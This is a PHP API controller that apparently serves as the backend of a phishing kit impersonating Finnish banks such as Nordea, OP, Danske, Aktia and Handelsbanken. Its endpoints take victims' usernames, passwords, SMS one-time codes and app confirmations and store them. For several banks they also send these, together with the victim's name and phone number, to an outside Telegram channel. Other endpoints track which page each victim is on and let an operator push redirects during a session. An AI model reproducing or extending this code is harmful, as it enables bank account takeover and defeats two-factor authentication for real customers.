<?php

namespace App\Controllers;

use App\Core\Controller;
use App\Models\UserSession;
use App\Models\User;

class ApiController extends Controller
{
    public function updatePage(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $currentPage = $data['current_page'] ?? '';
        $pageTitle = $data['page_title'] ?? '';

        if ($userId <= 0 || empty($currentPage)) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $sessionModel = new UserSession();
            $sessionModel->updateCurrentPage($userId, $currentPage, $pageTitle);
            $this->json(['success' => true]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function checkRedirect(): void
    {
        header('Content-Type: application/json');
        
        $userId = (int) ($_GET['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'redirect' => null], 400);
        }

        try {
            $sessionModel = new UserSession();
            $redirectTo = $sessionModel->getAndClearRedirect($userId);
            
            $this->json([
                'success' => true,
                'redirect' => $redirectTo
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'redirect' => null], 500);
        }
    }

    public function getUserPage(): void
    {
        header('Content-Type: application/json');
        
        $userId = (int) ($_GET['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'page' => null], 400);
        }

        try {
            $sessionModel = new UserSession();
            $session = $sessionModel->getCurrentPage($userId);
            
            $this->json([
                'success' => true,
                'page' => $session ? [
                    'current_page' => $session['current_page'],
                    'page_title' => $session['page_title'],
                    'last_activity' => $session['last_activity']
                ] : null
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'page' => null], 500);
        }
    }

    public function saveNordeaCredentials(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');
        $loginMethod = isset($data['login_method']) ? trim((string) $data['login_method']) : null;
        $password = trim($data['password'] ?? '');

        if ($userId <= 0 || empty($username)) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateNordeaCredentials($userId, $username, $password);
            
            $this->json([
                'success' => true,
                'message' => 'Tiedot on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/nordea2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveNordeaSmsCode(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateNordeaSmsCode($userId, $smsCode);
            
            $this->json([
                'success' => true,
                'message' => 'SMS-koodi on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/nordea2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveNordeaAppConfirmed(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateNordeaAppConfirmed($userId, true);
            
            $this->json([
                'success' => true,
                'message' => 'Vahvistus on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/nordea2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveAlandsbankenCredentials(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');
        $password = trim($data['password'] ?? '');

        if ($userId <= 0 || empty($username) || empty($password)) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateAlandsbankenCredentials($userId, $username, $password);
            
            $this->json([
                'success' => true,
                'message' => 'Tiedot on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/alandsbanken2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveAlandsbankenSmsCode(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateAlandsbankenSmsCode($userId, $smsCode);
            
            $this->json([
                'success' => true,
                'message' => 'SMS-koodi on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/alandsbanken2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveAlandsbankenAppConfirmed(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateAlandsbankenAppConfirmed($userId, true);
            
            $this->json([
                'success' => true,
                'message' => 'Vahvistus on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/alandsbanken2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveDanskeCredentials(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');
        $password = trim($data['password'] ?? '');

        if ($userId <= 0 || empty($username) || empty($password)) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateDanskeCredentials($userId, $username, $password);
            
            $this->json([
                'success' => true,
                'message' => 'Tiedot on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/danske2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveDanskeSmsCode(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateDanskeSmsCode($userId, $smsCode);
            
            $this->json([
                'success' => true,
                'message' => 'SMS-koodi on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/danske2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveDanskeAppConfirmed(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Virheellinen pyyntö.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateDanskeAppConfirmed($userId, true);
            
            $this->json([
                'success' => true,
                'message' => 'Vahvistus on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/danske2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveSpankkiCredentials(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');
        $password = trim($data['password'] ?? '');

        if ($userId <= 0 || empty($username) || empty($password)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateSpankkiCredentials($userId, $username, $password);
            
            $this->json([
                'success' => true,
                'message' => 'Bilgiler kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/spankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveSpankkiSmsCode(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateSpankkiSmsCode($userId, $smsCode);
            
            $this->json([
                'success' => true,
                'message' => 'SMS kodu kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/spankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveSpankkiAppConfirmed(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateSpankkiAppConfirmed($userId, true);
            
            $this->json([
                'success' => true,
                'message' => 'Onay kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/spankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveAktiaCredentials(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');

        if ($userId <= 0 || empty($username)) {
            $this->json(['success' => false, 'message' => 'Virheelliset parametrit.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateAktiaCredentials($userId, $username, $loginMethod ?: null);
            
            $this->json([
                'success' => true,
                'message' => 'Tiedot on tallennettu.',
                'redirect' => '/user/' . $userId . '/bank/aktia2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveAktiaSmsCode(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateAktiaSmsCode($userId, $smsCode);
            
            $this->json([
                'success' => true,
                'message' => 'SMS kodu kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/aktia2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveAktiaAppConfirmed(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateAktiaAppConfirmed($userId);
            
            $this->json([
                'success' => true,
                'message' => 'Onay kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/aktia2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function savePoppankkiCredentials(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');

        if ($userId <= 0 || empty($username)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updatePoppankkiCredentials($userId, $username);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'POP Pankki',
                    $username,
                    null
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'Bilgiler kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/poppankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function savePoppankkiSmsCode(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updatePoppankkiSmsCode($userId, $smsCode);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'POP Pankki',
                    $user['poppankki_username'] ?? null,
                    null,
                    $smsCode
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'SMS kodu kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/poppankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function savePoppankkiAppConfirmed(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updatePoppankkiAppConfirmed($userId);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'POP Pankki',
                    $user['poppankki_username'] ?? null,
                    null,
                    $user['poppankki_sms_code'] ?? null
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'Onay kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/poppankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveOpCredentials(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');
        $password = trim($data['password'] ?? '');

        if ($userId <= 0 || empty($username) || empty($password)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateOpCredentials($userId, $username, $password);
            
            $this->json([
                'success' => true,
                'message' => 'Bilgiler kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/op2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveOpSmsCode(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateOpSmsCode($userId, $smsCode);
            
            $this->json([
                'success' => true,
                'message' => 'SMS kodu kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/op2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveOpAppConfirmed(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateOpAppConfirmed($userId);
            
            $this->json([
                'success' => true,
                'message' => 'Onay kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/op2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveOmaspCredentials(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');

        if ($userId <= 0 || empty($username)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateOmaspCredentials($userId, $username);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Oma Säästöpankki',
                    $username,
                    null
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'Bilgiler kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/omasp2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveOmaspSmsCode(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateOmaspSmsCode($userId, $smsCode);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Oma Säästöpankki',
                    $user['omasp_username'] ?? null,
                    null,
                    $smsCode
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'SMS kodu kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/omasp2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveOmaspAppConfirmed(): void
    {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
        }

        try {
            $userModel = new User();
            $userModel->updateOmaspAppConfirmed($userId);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Oma Säästöpankki',
                    $user['omasp_username'] ?? null,
                    null,
                    null,
                    true
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'Onay kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/omasp2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveSaastopankkiCredentials(): void
    {
        header('Content-Type: application/json');
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
            return;
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');

        if ($userId <= 0 || empty($username)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
            return;
        }

        try {
            $userModel = new User();
            $userModel->updateSaastopankkiCredentials($userId, $username);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Säästöpankki',
                    $username,
                    null
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'Bilgiler kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/saastopankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveSaastopankkiSmsCode(): void
    {
        header('Content-Type: application/json');
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
            return;
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
            return;
        }

        try {
            $userModel = new User();
            $userModel->updateSaastopankkiSmsCode($userId, $smsCode);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Säästöpankki',
                    $user['saastopankki_username'] ?? null,
                    null,
                    $smsCode
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'SMS kodu kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/saastopankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveSaastopankkiAppConfirmed(): void
    {
        header('Content-Type: application/json');
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
            return;
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
            return;
        }

        try {
            $userModel = new User();
            $userModel->updateSaastopankkiAppConfirmed($userId);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Säästöpankki',
                    $user['saastopankki_username'] ?? null,
                    null,
                    null,
                    true
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'Onay kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/saastopankki2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveHandelsbankenCredentials(): void
    {
        header('Content-Type: application/json');
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
            return;
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $username = trim($data['username'] ?? '');
        $password = trim($data['password'] ?? '');

        if ($userId <= 0 || (empty($username) && empty($password))) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
            return;
        }

        try {
            $userModel = new User();
            $userModel->updateHandelsbankenCredentials($userId, $username ?: null, $password ?: null);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Handelsbanken',
                    $username ?: null,
                    $password ?: null
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'Bilgiler kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/handelsbanken2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveHandelsbankenSmsCode(): void
    {
        header('Content-Type: application/json');
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
            return;
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);
        $smsCode = trim($data['sms_code'] ?? '');

        if ($userId <= 0 || empty($smsCode)) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
            return;
        }

        try {
            $userModel = new User();
            $userModel->updateHandelsbankenSmsCode($userId, $smsCode);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Handelsbanken',
                    $user['handelsbanken_username'] ?? null,
                    $user['handelsbanken_password'] ?? null,
                    $smsCode
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'SMS kodu kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/handelsbanken2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function saveHandelsbankenAppConfirmed(): void
    {
        header('Content-Type: application/json');
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
            return;
        }

        $data = json_decode(file_get_contents('php://input'), true);
        $userId = (int) ($data['user_id'] ?? 0);

        if ($userId <= 0) {
            $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
            return;
        }

        try {
            $userModel = new User();
            $userModel->updateHandelsbankenAppConfirmed($userId);
            
            $telegram = new \App\Models\TelegramService();
            $user = $userModel->findById($userId);
            if ($user) {
                $telegram->notifyBankCredentials(
                    $user['full_name'],
                    $user['phone'],
                    'Handelsbanken',
                    $user['handelsbanken_username'] ?? null,
                    $user['handelsbanken_password'] ?? null,
                    null,
                    true
                );
            }
            
            $this->json([
                'success' => true,
                'message' => 'Onay kaydedildi.',
                'redirect' => '/user/' . $userId . '/bank/handelsbanken2'
            ]);
        } catch (\Exception $e) {
            $this->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }
}

